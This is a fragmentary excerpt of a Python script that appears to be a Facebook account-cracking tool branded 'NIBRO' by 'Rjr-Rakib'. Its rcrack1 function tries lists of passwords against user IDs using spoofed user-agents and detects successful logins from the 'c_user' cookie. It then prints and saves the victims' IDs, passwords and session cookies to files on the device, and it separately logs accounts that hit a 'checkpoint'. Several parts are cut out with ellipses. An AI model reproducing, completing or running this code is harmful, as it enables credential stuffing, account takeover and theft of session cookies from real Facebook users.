...
for txxxtt in range (1000):
	...
	ugen.append(ffg)
#--------------------------(LOGO BOX)--------------------------#
logo =( _  _________  ___  ____  ____    
       / |/ /  _/ _ )/ _ \/ __ \/ __ \   
      /    // // _  / , _/ /_/ / /_/ /   
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mRᴊʀ-𝗥ᴀᴋɪʙ
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46m𝗥AKIB ON 🔥
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://github.com/Khairoooo/NIBRO.git)
...
def v2():
    ...
    os.system('xdg-open https://m.me/j/AbaED-pXCmPLFQ2-/')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sRᴊʀ-𝗥ᴀᴋɪʙ\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[Rᴊʀ-𝗥ᴀᴋɪʙ-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/Rᴊʀ-𝗥ᴀᴋɪʙ-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
  #            print(f"\x1b[38;5;196m[Rᴊʀ-𝗥ᴀᴋɪʙ-CP💔] {uid}|{ps}")
                open('/sdcard/Rᴊʀ-𝗥ᴀᴋɪʙ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
